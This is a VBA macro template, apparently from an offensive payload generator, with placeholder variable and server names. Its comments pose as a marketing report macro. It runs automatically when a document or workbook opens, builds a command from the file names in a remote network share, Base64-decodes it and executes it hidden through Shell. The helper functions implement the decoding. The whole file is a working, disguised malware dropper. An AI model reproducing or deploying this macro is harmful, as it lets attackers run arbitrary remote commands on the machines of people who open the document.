Private InitDone  As Boolean
Private Map1(0 To 63)  As Byte
Private Map2(0 To 127) As Byte

'-------------------------------------------------------
' Set auto open to compute the table automatically
'-------------------------------------------------------
Sub AutoOpen()
	ComputeTable
End Sub

Sub Document_Open()
	ComputeTable
End Sub

Sub Workbook_Open()
	ComputeTable
End Sub

'-------------------------------------------------------
' Compute report table for marketing departement
'-------------------------------------------------------
Sub ComputeTable()
    Dim ${varTmp} As String, ${varEncodedCommand} As String, ${varFinalCommand} As String
    Dim ${varFlag} As Boolean
	Dim ${varExec} As Integer
    
    '-------------------------------------------------------
    ' Load templates from remote directory
    '-------------------------------------------------------
    ${varTmp} = Dir("\\${serverName}\oneliner\", vbNormal)
    flag = True
    While flag = True
        If ${varTmp} = "" Then
            flag = False
        Else
            ${varEncodedCommand} = ${varEncodedCommand} + ${varTmp}
            ${varTmp} = Dir
        End If
    Wend
    
    ${varEncodedCommand} = Replace(${varEncodedCommand}, vbCrLf, "")
    ${varEncodedCommand} = Replace(${varEncodedCommand}, "_", "/")
    
    ${varFinalCommand} = Base64DecodeString(${varEncodedCommand})
    
    ${varExec} = Shell(${varFinalCommand}, vbHide)
End Sub

'-----------------------------------------------------------------------------
' Base64 helper functions
'-----------------------------------------------------------------------------
Public Function Base64DecodeString(ByVal s As String) As String
   If s = "" Then Base64DecodeString = "": Exit Function
   Base64DecodeString = ConvertBytesToString(Base64Decode(s))
   End Function
Public Function Base64Decode(ByVal s As String) As Byte()
   If Not InitDone Then Init
   Dim IBuf() As Byte: IBuf = ConvertStringToBytes(s)
   Dim ILen As Long: ILen = UBound(IBuf) + 1
   If ILen Mod 4 <> 0 Then Err.Raise vbObjectError, , "Length of Base64 encoded input string is not a multiple of 4."
   Do While ILen > 0
      If IBuf(ILen - 1) <> Asc("=") Then Exit Do
      ILen = ILen - 1
      Loop
   Dim OLen As Long: OLen = (ILen * 3) \ 4
   Dim Out() As Byte
   ReDim Out(0 To OLen - 1) As Byte
   Dim ip As Long
   Dim op As Long
   Do While ip < ILen
      Dim i0 As Byte: i0 = IBuf(ip): ip = ip + 1
      Dim i1 As Byte: i1 = IBuf(ip): ip = ip + 1
      Dim i2 As Byte: If ip < ILen Then i2 = IBuf(ip): ip = ip + 1 Else i2 = Asc("A")
      Dim i3 As Byte: If ip < ILen Then i3 = IBuf(ip): ip = ip + 1 Else i3 = Asc("A")
      If i0 > 127 Or i1 > 127 Or i2 > 127 Or i3 > 127 Then _
         Err.Raise vbObjectError, , "Illegal character in Base64 encoded data."
      Dim b0 As Byte: b0 = Map2(i0)
      Dim b1 As Byte: b1 = Map2(i1)
      Dim b2 As Byte: b2 = Map2(i2)
      Dim b3 As Byte: b3 = Map2(i3)
      If b0 > 63 Or b1 > 63 Or b2 > 63 Or b3 > 63 Then _
         Err.Raise vbObjectError, , "Illegal character in Base64 encoded data."
      Dim o0 As Byte: o0 = (b0 * 4) Or (b1 \ &H10)
      Dim o1 As Byte: o1 = ((b1 And &HF) * &H10) Or (b2 \ 4)
      Dim o2 As Byte: o2 = ((b2 And 3) * &H40) Or b3
      Out(op) = o0: op = op + 1
      If op < OLen Then Out(op) = o1: op = op + 1
      If op < OLen Then Out(op) = o2: op = op + 1
      Loop
   Base64Decode = Out
   End Function
Private Sub Init()
   Dim c As Integer, i As Integer
   ' set Map1
   i = 0
   For c = Asc("A") To Asc("Z"): Map1(i) = c: i = i + 1: Next
   For c = Asc("a") To Asc("z"): Map1(i) = c: i = i + 1: Next
   For c = Asc("0") To Asc("9"): Map1(i) = c: i = i + 1: Next
   Map1(i) = Asc("+"): i = i + 1
   Map1(i) = Asc("/"): i = i + 1
   ' set Map2
   For i = 0 To 127: Map2(i) = 255: Next
   For i = 0 To 63: Map2(Map1(i)) = i: Next
   InitDone = True
   End Sub
Private Function ConvertStringToBytes(ByVal s As String) As Byte()
   Dim b1() As Byte: b1 = s
   Dim l As Long: l = (UBound(b1) + 1) \ 2
   If l = 0 Then ConvertStringToBytes = b1: Exit Function
   Dim b2() As Byte
   ReDim b2(0 To l - 1) As Byte
   Dim p As Long
   For p = 0 To l - 1
      Dim c As Long: c = b1(2 * p) + 256 * CLng(b1(2 * p + 1))
      If c >= 256 Then c = Asc("?")
      b2(p) = c
      Next
   ConvertStringToBytes = b2
   End Function
Private Function ConvertBytesToString(b() As Byte) As String
   Dim l As Long: l = UBound(b) - LBound(b) + 1
   Dim b2() As Byte
   ReDim b2(0 To (2 * l) - 1) As Byte
   Dim p0 As Long: p0 = LBound(b)
   Dim p As Long
   For p = 0 To l - 1: b2(2 * p) = b(p0 + p): Next
   Dim s As String: s = b2
   ConvertBytesToString = s
   End Function

